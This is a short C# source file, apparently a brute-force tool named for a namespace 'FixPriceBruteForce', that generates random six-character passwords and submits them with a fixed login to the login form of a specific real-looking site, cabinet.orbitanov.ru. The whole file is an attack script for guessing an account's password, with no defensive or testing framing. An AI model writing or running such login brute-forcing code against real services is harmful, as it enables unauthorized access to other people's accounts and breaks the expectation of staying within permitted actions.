using AngleSharp;
using AngleSharp.Io;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;


namespace FixPriceBruteForce
{
    class OrbitaBruteForce
    {
        public OrbitaBruteForce()
        {

        }
        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        public async Task Brute()
        {
            List<Task> tasks = new List<Task>();
            List<string> passwords = new List<string>();
            for (int i = 0; i < 10; i++)
            {
                passwords.Add(RandomString(6));
            }
            foreach (var password in passwords)
            {
                await Connect("npi4351", password);
            }
        }

        private async Task Connect(string login, string password)
        {
            var config = Configuration.Default.WithDefaultCookies().WithDefaultLoader();
            var context = BrowsingContext.New(config);
            var dictonary = new Dictionary<string, string>();
            dictonary.Add(@"LoginForm[login]", login);
            dictonary.Add(@"LoginForm[password]", password);
            var documentRequest = DocumentRequest.PostAsUrlencoded(new Url("https://cabinet.orbitanov.ru/site/login"),
                dictonary);
            var request = await context.OpenAsync(documentRequest);
            Console.WriteLine(request.Title);
        }

    }
}
